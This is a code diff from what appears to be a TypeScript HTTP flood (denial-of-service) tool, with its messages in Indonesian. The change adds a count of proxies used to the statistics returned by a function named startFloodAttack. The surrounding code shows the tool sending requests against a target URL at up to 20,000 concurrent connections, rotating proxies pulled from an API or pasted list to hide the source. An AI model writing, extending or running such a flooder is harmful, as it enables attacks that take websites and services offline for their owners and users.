@@ -12,6 +12,7 @@ export interface FloodStats {
   failed: number;
   error?: string;
   statusCodeCounts?: Record<number, number>;
+  proxiesUsed?: number;
 }
 
 const METHODS_WITHOUT_BODY_BASE = ["GET", "HEAD", "DELETE", "OPTIONS"];
@@ -46,11 +47,11 @@ export async function startFloodAttack(
   try {
     parsedUrl = new URL(targetUrl);
   } catch (e) {
-    return { totalSent: 0, successful: 0, failed: 0, error: "URL target tidak valid. Harap sertakan skema (mis., http:// atau https://)." };
+    return { totalSent: 0, successful: 0, failed: 0, error: "URL target tidak valid. Harap sertakan skema (mis., http:// atau https://).", proxiesUsed: 0 };
   }
 
   if (parsedUrl.protocol !== "http:" && parsedUrl.protocol !== "https:") {
-     return { totalSent: 0, successful: 0, failed: 0, error: "URL target harus menggunakan protokol http atau https." };
+     return { totalSent: 0, successful: 0, failed: 0, error: "URL target harus menggunakan protokol http atau https.", proxiesUsed: 0 };
   }
 
   const safeConcurrency = Math.min(Math.max(1, concurrency ?? 50), 20000);
@@ -58,7 +59,7 @@ export async function startFloodAttack(
   const safeDuration = Math.min(Math.max(5, durationInSeconds ?? 10), 60);
 
   if (safeConcurrency <= 0 || safeRate <= 0 || safeDuration <=0) {
-    return { totalSent: 0, successful: 0, failed: 0, error: "Konkurensi, tingkat, dan durasi harus bernilai positif." };
+    return { totalSent: 0, successful: 0, failed: 0, error: "Konkurensi, tingkat, dan durasi harus bernilai positif.", proxiesUsed: 0 };
   }
 
   let actualHttpMethod = method;
@@ -163,7 +164,7 @@ export async function startFloodAttack(
         if (currentActiveProxies.length > 0) {
             console.log(`Initialized with ${currentActiveProxies.length} proxies from textarea (API fallback).`);
         } else if (proxiesString && proxiesString.trim().length > 0){
-             return { totalSent: 0, successful: 0, failed: 0, error: "Gagal mengambil proksi dari API dan string proksi dari textarea tidak valid atau tidak menghasilkan entri ip:port yang valid setelah pembersihan." };
+             return { totalSent: 0, successful: 0, failed: 0, error: "Gagal mengambil proksi dari API dan string proksi dari textarea tidak valid atau tidak menghasilkan entri ip:port yang valid setelah pembersihan.", proxiesUsed: 0 };
         } else {
             console.log("No proxies available from API or textarea for initial load.");
         }
@@ -173,12 +174,13 @@ export async function startFloodAttack(
     if (currentActiveProxies.length > 0) {
         console.log(`Initialized with ${currentActiveProxies.length} proxies from textarea.`);
     } else if (proxiesString && proxiesString.trim().length > 0) {
-        return { totalSent: 0, successful: 0, failed: 0, error: "String proksi dari textarea tidak valid atau tidak menghasilkan entri ip:port yang valid setelah pembersihan. Tidak ada URL API yang diberikan." };
+        return { totalSent: 0, successful: 0, failed: 0, error: "String proksi dari textarea tidak valid atau tidak menghasilkan entri ip:port yang valid setelah pembersihan. Tidak ada URL API yang diberikan.", proxiesUsed: 0 };
     } else {
         console.log("No proxies provided via textarea or API URL.");
     }
   }
 
+  const initialProxyCount = currentActiveProxies.length;
   let totalSent = 0;
   let successful = 0;
   let failed = 0;
@@ -186,7 +188,7 @@ export async function startFloodAttack(
   const startTime = Date.now();
   const endTime = startTime + safeDuration * 1000;
 
-  console.log(`Mulai banjir: ${method} ${targetUrl}, Konkurensi: ${safeConcurrency}, Tingkat: ${safeRate} RPS, Durasi: ${safeDuration}d, Proksi awal: ${currentActiveProxies.length}, API Proksi: ${proxyApiUrl ?? 'Tidak ada'}, HTTP/1.1 Paksa: ${isHttp1Forced}`);
+  console.log(`Mulai banjir: ${method} ${targetUrl}, Konkurensi: ${safeConcurrency}, Tingkat: ${safeRate} RPS, Durasi: ${safeDuration}d, Proksi awal: ${initialProxyCount}, API Proksi: ${proxyApiUrl ?? 'Tidak ada'}, HTTP/1.1 Paksa: ${isHttp1Forced}`);
   
   const http1Agent = isHttp1Forced && parsedUrl.protocol === "https:" ? new https.Agent({ keepAlive: true, alpnProtocols: ['http/1.1'] }) : undefined;
   
@@ -297,7 +299,7 @@ export async function startFloodAttack(
 
   } catch (e: any) {
     console.error("Kesalahan serangan banjir:", e);
-    return { totalSent, successful, failed, statusCodeCounts, error: e.message || "Terjadi kesalahan tak terduga selama banjir." };
+    return { totalSent, successful, failed, statusCodeCounts, error: e.message || "Terjadi kesalahan tak terduga selama banjir.", proxiesUsed: initialProxyCount };
   } finally {
     console.log(`Banjir berakhir: Total Terkirim: ${totalSent}, Berhasil: ${successful}, Gagal: ${failed}, Kode Status: ${JSON.stringify(statusCodeCounts)}`);
   }
@@ -323,7 +325,8 @@ export async function startFloodAttack(
     totalSent: reconciledTotal, 
     successful: reconciledSuccessful, 
     failed: reconciledFailed, 
-    statusCodeCounts 
+    statusCodeCounts,
+    proxiesUsed: initialProxyCount
   };
 }
 
